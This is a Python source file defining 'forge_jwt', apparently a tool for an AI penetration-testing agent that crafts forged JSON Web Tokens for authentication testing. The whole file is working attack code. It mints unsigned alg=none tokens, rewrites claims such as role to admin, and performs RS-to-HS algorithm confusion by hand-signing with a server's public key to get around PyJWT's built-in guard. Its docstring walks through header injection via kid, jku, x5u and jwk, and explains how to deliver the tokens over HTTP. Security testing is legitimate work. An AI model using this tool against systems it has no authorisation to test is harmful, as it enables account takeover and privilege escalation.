"""``forge_jwt`` — craft JWTs for authentication testing (OWASP API2).

This tool only *produces* a token; it never sends anything. The agent delivers
the forged token through the HTTP tools, e.g.::

    repeat_request(request_id, modifications={"headers": {"Authorization": "Bearer <token>"}})

then diffs the response against the original to see whether the forgery was
accepted. That split (PyJWT mints the token, the HTTP tool delivers it) is why
no shell/CLI is needed for JWT attacks.
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import logging
from typing import Any

import jwt
from agents import function_tool


logger = logging.getLogger(__name__)

_HMAC_HASHES = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}


def _decode_unverified(token: str) -> tuple[dict[str, Any], dict[str, Any]]:
    """Return (header, payload) of a token without verifying its signature."""
    header = jwt.get_unverified_header(token)
    payload = jwt.decode(token, options={"verify_signature": False})
    return header, payload


def _b64(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def _manual_hmac_encode(
    payload: dict[str, Any], key: str, alg: str, headers: dict[str, Any] | None
) -> str:
    """HMAC-sign with ``key`` bytes directly, bypassing PyJWT's guard against
    using an asymmetric/PEM key as an HMAC secret — this is what makes the
    RS→HS algorithm-confusion forgery possible."""
    header = {"typ": "JWT", "alg": alg, **(headers or {})}
    segment = (
        _b64(json.dumps(header, separators=(",", ":")).encode())
        + "."
        + _b64(json.dumps(payload, separators=(",", ":")).encode())
    )
    sig = hmac.new(key.encode(), segment.encode(), _HMAC_HASHES[alg]).digest()
    return f"{segment}.{_b64(sig)}"


@function_tool(timeout=15, strict_mode=False)
async def forge_jwt(
    base_token: str | None = None,
    claims: dict[str, Any] | None = None,
    claim_overrides: dict[str, Any] | None = None,
    algorithm: str = "none",
    key: str | None = None,
    extra_headers: dict[str, Any] | None = None,
) -> str:
    """Forge a JWT for authentication/authorization testing (OWASP API2).

    Returns the token string plus its decoded header/payload. It does NOT send
    anything — deliver the token yourself via ``send_request`` / ``repeat_request``
    (typically as an ``Authorization: Bearer <token>`` header) and compare the
    response to a baseline to see if the forgery was accepted.

    Common attacks (set the args accordingly):

    - **alg=none** (unsigned acceptance): ``algorithm="none"`` with no ``key``.
      Pass the victim's ``base_token`` and edit its claims via ``claim_overrides``
      (e.g. bump ``role`` to ``admin`` or swap ``sub``/``user_id``).
    - **Claim tampering, re-signed**: ``base_token`` + ``claim_overrides`` +
      ``algorithm="HS256"`` + a ``key`` you believe is the secret (weak/guessed/
      leaked secret cases).
    - **RS→HS algorithm confusion**: ``algorithm="HS256"`` with ``key`` set to the
      server's RSA/EC **public** key (PEM). If the server verifies RS256 tokens
      but naively trusts the header ``alg``, it will HMAC-verify with the public
      key it published — which you also hold.
    - **Header injection** (``kid`` / ``jku`` / ``x5u`` / ``jwk``): put them in
      ``extra_headers`` to point key resolution at an attacker-controlled source
      or a path-traversal/SQLi ``kid``.

    Args:
        base_token: An existing token to clone claims/header from (optional).
            Its signature is NOT verified — it is only decoded.
        claims: The full payload to encode, used when there is no ``base_token``.
        claim_overrides: Claims merged on top of the base/claims payload.
        algorithm: JWT ``alg`` to sign with: ``none`` (unsigned), ``HS256`` /
            ``HS384`` / ``HS512`` (needs a symmetric ``key``), or an asymmetric
            alg with a private-key ``key``.
        key: The signing key — HMAC secret, PEM private key, or (for RS→HS
            confusion) the server's PEM public key. Omit for ``algorithm="none"``.
        extra_headers: Extra JWT header fields to inject (``kid``, ``jku``,
            ``x5u``, ``jwk``, ``typ`` …).
    """
    try:
        payload: dict[str, Any] = {}
        if base_token:
            _, payload = _decode_unverified(base_token)
        elif claims:
            payload = dict(claims)
        if claim_overrides:
            payload.update(claim_overrides)

        alg = (algorithm or "none").strip()
        # PyJWT's "none" algorithm requires a falsy key; a signing alg needs a key.
        sign_key = "" if alg.lower() == "none" else (key or "")
        if alg.lower() != "none" and not sign_key:
            return json.dumps(
                {
                    "success": False,
                    "error": f"algorithm {alg!r} needs a key (HMAC secret or PEM); "
                    "use algorithm='none' for an unsigned token",
                },
                ensure_ascii=False,
            )

        try:
            token = jwt.encode(payload, sign_key, algorithm=alg, headers=extra_headers or None)
        except jwt.exceptions.InvalidKeyError:
            # PyJWT refuses to HMAC-sign with a PEM/asymmetric key (its defense
            # against the confusion attack). For an attack tool that is exactly
            # the token we want to mint, so sign it manually.
            if alg not in _HMAC_HASHES:
                raise
            token = _manual_hmac_encode(payload, sign_key, alg, extra_headers)

        header, decoded = _decode_unverified(token)
        return json.dumps(
            {
                "success": True,
                "token": token,
                "header": header,
                "payload": decoded,
                "hint": "Deliver as 'Authorization: Bearer <token>' via send_request/"
                "repeat_request, then diff against a baseline response.",
            },
            ensure_ascii=False,
            default=str,
        )
    except Exception as exc:  # noqa: BLE001 - surface crafting errors to the model.
        logger.debug("forge_jwt failed", exc_info=True)
        return json.dumps({"success": False, "error": f"forge_jwt failed: {exc}"}, default=str)
